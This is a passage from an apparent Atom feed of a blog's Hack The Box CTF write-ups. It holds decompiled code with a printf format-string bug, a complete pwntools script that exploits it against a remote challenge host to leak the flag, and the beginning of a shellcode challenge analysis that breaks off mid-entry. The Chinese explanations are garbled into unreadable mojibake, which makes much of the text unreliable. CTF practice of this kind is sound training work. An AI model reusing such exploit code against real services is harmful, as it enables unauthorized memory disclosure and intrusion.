printf(&amp;quot;%s\n\n[-] You lost the race and all your coins!\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    coins = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return printf(&amp;quot;[+] Current coins: [%d]%s\n&amp;quot;, 0, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;é‡Œé¢è°ƒç”¨äº†ä¸€ä¸ª fopen æ‰“å¼€äº†ä¸€ä¸ª flag.txt æˆ‘ä»¬ç›®æ ‡å‡ºç°äº†&lt;/p&gt;
&lt;p&gt;åˆ†æä¸€ä¸‹è¿™ä¸ªä»£ç &lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹èµ‹å€¼ç»™ v4 ä»¥åŠ v6 ä¸º - 1 ä½¿ç”¨äº†ä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;do while å¾ªç¯åˆ¤æ–­æ˜¯å¦ä¸º 1 æˆ– 2ï¼Œå¦‚æœä¸ºå…¶ä»–æ•°çš„è¯å°±æ‰“å°&lt;/p&gt;
&lt;p&gt;[-] Invalid choice!&lt;/p&gt;
&lt;p&gt;ç„¶åè°ƒç”¨ race_type () å…¶å®ä¹Ÿæ˜¯ä¸€æ ·&lt;/p&gt;
&lt;p&gt;ç„¶åè®¾ç½® srand (time (0))&lt;/p&gt;
&lt;p&gt;if ( v9 == 1 &amp;amp;&amp;amp; (result = v5, v5 &amp;lt; v7) || v9 == 2 &amp;amp;&amp;amp; (result = v5, v5 &amp;gt; v7) )&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåˆ¤æ–­çš„è¯å°±æ˜¯ä½ è¦ä¹ˆè¾“å…¥ 2 ä¸ç„¶å°±ä¸ºå‡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fgets(v13, 44, stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read(0, buf, 0x170u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts(&amp;quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return printf((const char *)buf);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨å¯ä»¥åˆ©ç”¨çš„ç‚¹å°±è¯´è¿™ä¸ª printf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡º&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬åˆ©ç”¨è„šæœ¬æ¥è¾“å‡ºçœ‹çœ‹&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset_start_flag = 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;len_of_flag = 44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset_end_flag = offset_start_flag + 11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;formatstring = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(offset_start_flag, offset_end_flag):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    formatstring += &amp;quot;%&amp;quot;+str(i)+&amp;quot;$p &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(formatstring) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = remote(&amp;quot;167.99.82.136&amp;quot;,30709)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;Name: &amp;quot;, &amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;Nickname: &amp;quot;, &amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&amp;quot;&amp;gt; &amp;quot;, formatstring)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = r.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Format output&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;preflag = (response.decode(&amp;quot;utf-8&amp;quot;).split(&amp;quot;m\n&amp;quot;))[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;preflag = preflag.split()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for hexdecimal in preflag:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag += p32(int(hexdecimal, base=16)).decode(&amp;quot;utf-8&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(flag)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-13T07:34:15.000Z</updated>
    </entry>
    <entry>
        <id>https://lookhui.github.io/HTB-hunting-md/</id>
        <title>HTB-hunting</title>
        <link rel="alternate" href="https://lookhui.github.io/HTB-hunting-md/"/>
        <content type="html">&lt;h1 id=&#34;htb-hunting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htb-hunting&#34;&gt;#&lt;/a&gt; HTB-hunting&lt;/h1&gt;
&lt;p&gt;è¿™æ˜¯ä¸€é“æ‰‹å†™ shellcode é¢˜ç›®&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å¼€å¯äº† PIE åœ°å€éšæœºåŒ–&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ strings&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tdH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/lib/ld-linux.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_stdin_used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strcpy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srand&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;perror&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;signal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mmap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prctl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;memset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alarm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__cxa_finalize&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.1.3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_deregisterTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gmon_start__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_ITM_registerTMCloneTable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[^_]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prctl(PR_SET_NO_NEW_PRIVS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prctl(PR_SET_SECCOMP)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/urandom&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9*2$&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTB&amp;#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.shstrtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.interp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.gnu.build-id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.gnu.property&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.ABI-tag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynsym&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynstr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version_r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.dyn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.got&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rodata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame_hdr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynamic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.comment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°é‡Œé¢æ˜¯æœ‰ä¸ª HTB {xxx} çš„ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;./hunting è¿è¡Œå°è¯•&lt;/p&gt;
&lt;p&gt;å‘ç°æ— è®ºè¾“å…¥ä»»ä½•æ•°éƒ½æ˜¾ç¤º&lt;/p&gt;
&lt;p&gt;Segmentation fault&lt;/p&gt;
&lt;p&gt;æ‹–å…¥ ida32 æŸ¥çœ‹&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰æ˜¾ç¤º main å‡½æ•°ï¼Œåªæœ‰è‡ªå·±æ‰¾ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç å¯ä»¥åˆ¤æ–­ä¸ºä¸»å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int sub_1460()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v1; // [esp-10h] [ebp-24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v2; // [esp-Ch] [ebp-20h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v3; // [esp-8h] [ebp-1Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v4; // [esp-4h] [ebp-18h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  void *buf; // [esp+0h] [ebp-14h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char *dest; // [esp+4h] [ebp-10h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  void *addr; // [esp+8h] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  addr = (void *)sub_13D0();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  signal(14, (__sighandler_t)&amp;amp;exit);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alarm(0xAu);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( dest == (char *)-1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_1120(-1, v1, v2, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  strcpy(dest, aHtbXxxxxxxxxxx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_133D();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = mmap(0, 0x1000u, 7, 33, -1, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(0, buf, 0x3Cu);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ((void (__stdcall *)(int, void *, _DWORD))buf)(v4, buf, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªä»£ç ä½¿ç”¨äº† mmap (addr, 0x1000u, 3, 49, -1, 0); è¯·æ±‚äº† 0x1000 å†…å­˜ç»™äº† dest ä»¥åŠ buf&lt;/p&gt;
&lt;p&gt;å¹¶ä¸”å°† strcpy (dest, aHtbXxxxxxxxxxx); æˆ‘ä»¬éœ€è¦çš„ flag æ‹·è´åˆ°äº† dest å†…å­˜ä¸­&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨ä½¿ç”¨äº† meset å‡½æ•°ç»™ flag ä¹‹å‰çš„å†…å­˜åœ°å€æ¸…é›¶&lt;/p&gt;
